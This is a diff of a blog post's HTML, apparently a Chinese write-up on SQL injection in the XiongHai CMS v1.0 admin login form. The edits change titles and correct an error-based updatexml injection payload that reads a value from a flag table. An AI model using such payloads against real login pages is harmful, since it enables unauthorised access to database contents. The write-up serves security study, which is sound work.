@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>熊海 CMS 后台登录的 SQL 注入</title>
+<title>熊海 CMS v1.0 后台登录存在 SQL 注入</title>
 
 
 
@@ -16,7 +16,7 @@
 
 
 
-<meta property="og:title" content="熊海 CMS 后台登录的 SQL 注入" />
+<meta property="og:title" content="熊海 CMS v1.0 后台登录存在 SQL 注入" />
 <meta property="og:description" content="管理员登录页面可以在不登录的情况下对 POST 的表单做 SQL 注入，利用语法报错泄露数据库信息" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli4/" /><meta property="article:section" content="posts" />
@@ -28,7 +28,7 @@
 
 
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="熊海 CMS 后台登录的 SQL 注入"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="熊海 CMS v1.0 后台登录存在 SQL 注入"/>
 <meta name="twitter:description" content="管理员登录页面可以在不登录的情况下对 POST 的表单做 SQL 注入，利用语法报错泄露数据库信息"/>
 
 
@@ -278,7 +278,7 @@
                 
             >
                 <div class="post-title">
-                    熊海 CMS 后台登录的 SQL 注入
+                    熊海 CMS v1.0 后台登录存在 SQL 注入
                     
                     <div class="post-subtitle">
                         管理员登录页面可以在不登录的情况下对 POST 的表单做 SQL 注入，利用语法报错泄露数据库信息
@@ -333,7 +333,7 @@
 <pre><code>1' and updatexml(1,concat(
     0x5c,
     0x7e,
-    (select value from flag_db.flag limit 0,1)，
+    (select value from flag_db.flag limit 0,1),
     0x7e
 ),1) and '1'='1
 </code></pre>
@@ -415,7 +415,7 @@ and '1'='1
 
                 
                 <a class="newer-posts" href="/posts/sec/sqli5/">
-			Next<br>BlueCMS v1.6 存在 XFF 伪造漏洞
+			Next<br>Blue CMS v1.6 留言区存在 XFF 伪造漏洞
                 </a>
                 
                 
